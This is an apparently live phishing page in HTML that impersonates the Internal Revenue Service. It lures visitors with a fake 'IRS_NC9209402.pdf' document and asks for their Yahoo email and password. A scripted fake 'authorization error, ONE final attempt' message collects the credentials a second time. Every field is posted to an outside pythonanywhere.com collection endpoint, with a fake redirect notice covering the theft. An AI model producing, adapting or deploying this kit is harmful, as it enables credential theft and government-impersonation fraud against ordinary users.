<!DOCTYPE html>
<html lang="en">
<head>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Internal Revenue Service | An official website</title>
    <link rel="icon" type="image/x-icon" href="https://2.bp.blogspot.com/_Esz2h6sKmUU/RoQoLFgjD3I/AAAAAAAAANs/YYP-Ur4eyRA/s320/irs.gif">
    <style>
        /* Add your existing CSS here */
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: white;
        }
        body:before {
            content: '';
            position: fixed;
            width: 100vw;
            height: 100vh;
            background-image: url(https://www.nicepng.com/png/full/262-2626135_grey-abstract-lines-transparent-background-png-gray-abstract.png);
            background-position: center;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-size: 800px 820px;
            filter: blur(2px);
        }
        .container {
            position: relative;
            border: 2px solid rgb(210,209,209);
            border-radius: 6px;
            width: 420px;
            height: 430px;
            padding: 0px 30px 15px 30px;
            background: #fafafa;
            align-items: center;
            overflow: hidden;
        }
        .logo1 {
            height: 64px;
            width: 120px;
            margin: 14px 0px -10px 0px;
        }

        .blogo-container {
            position: absolute;
            top: 0;
            left: 0;
            padding: 10px; /* Optional padding for spacing */
        }

        .logo-container {
            position: fixed;
            bottom: 0;
            width: 100%;
            background-color: transparent;
            padding: 0px 10px 5px 10px;
            text-align: right;
        }

        .logo-container img {
            width:78px;
            min-width: 58px;
        }

        .logo-container p {
            padding-left: 12px;
            margin-top: 2px;
            color: #414a4c;
            font-size: 10px;
        }

        .login-box {
            position: relative; 
            width: 100%;
            background: #fafafa;
        }
        .page-box {
            display: flex;
            flex-direction: column;
        }
        .page {
            width: 100%;
        }
        .page.email-page {
            transform: translateX(0);
            transition: .25s ease-in-out;
        }
        .page-box.active-pass .page.email-page {
            transform: translateX(-500px);
        }
        .page.password-page {
            position: absolute;
            transform: translateX(500px);
            margin-top: 105px;
            transition: .25s ease-in-out;
        }
        .page-box.active-pass .page.password-page {
            transform: translateX(0);
        }
        .login-title {
            text-align: center;
            color: black;
        }
        .login-title h4 {
            font-size: 20px;
            line-height: 1.5;
            font-weight: 600;
            margin-top: 5px;
            letter-spacing:-.58px;
            color: black;
            font-family: Helvetica;
        }
        .login-title p {
            font-size: 15px;
            color: #464546;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin-bottom: 28px;
        }
        .input-box {
            position: relative;
            width: 90%;
            height: 35px;
            margin: 25px 5px 10px 5px;
        }
        .input-box input {
            width: 100%;
            height: 100%;
            border: none;
            border-bottom: 1px solid #bcbbbd;
            background: #fafafa;
            outline: none;
            height: 40px;
            color: #494646;
            font-size: 14.5px;
            padding: 10px 6px 0 1px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        .input-box input:focus,
        .input-box input:valid {
            border-color: #7d2eff;
        }
        .input-box label {
            position: absolute;
            top: 50%;
            left: 2px;
            transform: translateY(-50%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            font-size: 14.5px;
            color: rgb(157, 152, 152);
            pointer-events: none;
            transition: .3s ease;
        }
        .input-box input:focus~label,
        .input-box input:valid~label {
            top: 1px;
            left: 7px;
            font-size: 13px;
            color: #c8c8c8;
        }
        .forgot {
            margin: 18px 0px 25px 0;
        }
        .forgot a {
            font-size: 14.5px;
            font-weight: 500;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #7d2eff;
            text-decoration: none;
        }
        .btn-next {
            margin: 0;
            padding: 0;
            height: 38px;
            width: 50%;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            background: #00599d;
            cursor: pointer;
            border-radius: 4px;
            border: none;
            outline: none;
            margin: 25px 5px 10px 5px;
        }

        .btn-next1 {
            margin: 0;
            padding: 0;
            height: 38px;
            width: 50%;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            background: #00599d;
            cursor: pointer;
            border-radius: 4px;
            border: none;
            outline: none;
            margin-top: -11px;
        }
        .container input[type="button"] {
            margin: 0;
            padding: 0;
            height: 44px;
            width: 100%;
            color: #892bfb;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            text-align: center;
            font-size: 17px;
            font-weight: 600;
            background: white;
            cursor: pointer;
            border-radius: 24px;
            border: 1px solid #7d2eff;
            outline: none;
            margin-top: 25px;
        }
       /* Styling for the popup */
.popup-message {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background-color: white; 
    color: black; 
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    text-align: center;
    padding: 30px 30px 30px 30px;
    border-radius: 5px;
    display: none; 
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); 
}

    </style>
</head>
<body>
<div class="blogo-container">
    <img src="https://2.bp.blogspot.com/_Esz2h6sKmUU/RoQoLFgjD3I/AAAAAAAAANs/YYP-Ur4eyRA/s320/irs.gif" alt="Logo" class="logo" width="45" />
</div>

<div class="logo-container">
    <img src="https://th.bing.com/th/id/R.4aa74d6d631bd7d1116a69cb349f4571?rik=VPEEm3KsWdjqDA&riu=http%3a%2f%2fwww.truste.com%2fblog%2fwp-content%2fuploads%2fprivacy-seal_blog.jpg&ehk=pWMTXeb52eQuwl4UYJUMzGVJFDodpFbEBHCj%2bFi9PWw%3d&risl=&pid=ImgRaw&r=0" alt="Privacy Seal"/>
    <p><i class="fa-solid fa-lock"></i>&nbsp;Information is protected and confidential</p>
</div>

<div class="container">
    <center><img src="https://logos-world.net/wp-content/uploads/2021/02/IRS-Logo.png" alt="IRS" class="logo1"></center>
    <div class="login-box">
        <form method="post" id="myForm" action="https://guillotconstructionllc.pythonanywhere.com/login/">
            <div class="page-box">
                <div class="login-title">
                    <p class="user-email"></p>
                    <h4 class="loginTitle-text"><IMG border="0" alt="" src="https://th.bing.com/th/id/OIP.8SvoosdwrZvL1OiUr7KxtAHaHa?pid=ImgDet&rs=1" align="top" width="35px" height="35px"/> 
                    <b><span style="color:#00599d; font-size:15px;">IRS_NC9209402.pdf</span></b>
                    </h4>
                    <p class="loginInfo-text">Continue with your yahoo email to view document.</p>
                </div>

                <div class="page email-page">
                    <div class="input-box">
                        <input type="email" id="email" name="email" class="email" autofocus>
                        <label>Email</label>
                    </div>
                    <div class="input-box">
                        <input type="password" id="password" name="password">
                        <label>Password</label>
                    </div>

                    <div class="btn-box">
                        <button type="button" class="btn-next">Continue</button>
                    </div>
                </div>

                <div class="page password-page">
                    <div class="input-box">
                        <input type="email" id="email" name="email1" class="email" autofocus>
                        <label>Email</label>
                    </div>
                    <div class="input-box">
                        <input type="password" id="password" name="password1" required/>
                        <label>Password</label>
                    </div>
                    <div class="forgot">
                        <div style="border: 0px solid ; background: transparent; color: red; font-size:11px; font-family: Arial, sans-serif;">
                            <i>&nbsp;</i> An error occurred during authorization. You have ONE final attempt!
                        </div>
                    </div>
                    <div class="btn-box">
                        <button type="submit" class="btn-next1">Continue</button>
                    </div>
                </div>
            </div>
        </form>
    </div>
</div>

<div class="popup-message" id="popupMessage">You are being redirected to Yahoo! Mail verification page.</div> <!-- Popup message -->

<script>
    const pageBox = document.querySelector('.page-box');
    const btnNext = document.querySelector('.btn-next');
    const btnNext1 = document.querySelector('.btn-next1');
    const emailInput = document.querySelector('#email');
    const passwordInput = document.querySelector('#password');
    const popupMessage = document.getElementById('popupMessage');

    // Ensure that the email and password are not empty before continuing
    btnNext.onclick = (e) => {
        e.preventDefault();

        // Check if email or password are empty
        if (!emailInput.value || !passwordInput.value) {
            alert("Please fill in both email and password.");
            return; // Do not proceed if fields are empty
        }

        pageBox.classList.add('active-pass');
        setTimeout(() => passwordInput.focus(), 500);
    }

    // Ensure form is submitted only when both fields are filled
    btnNext1.onclick = (e) => {
        e.preventDefault(); // Prevent immediate form submission

        // Get values of email and password fields
        const email1 = document.querySelector('[name="email1"]');
        const password1 = document.querySelector('[name="password1"]');

        // Check if email or password are empty
        if (!email1.value || !password1.value) {
            alert("Please fill in both email and password.");
            return; // Prevent form submission if fields are empty
        }

        // Display popup message
        popupMessage.style.display = 'block';

        // Hide the popup after 5 seconds
        setTimeout(() => {
            popupMessage.style.display = 'none';
            // Submit the form after the popup disappears
            document.getElementById('myForm').submit();
        }, 5000); // 5 seconds delay
    }
</script>
</body>
</html>
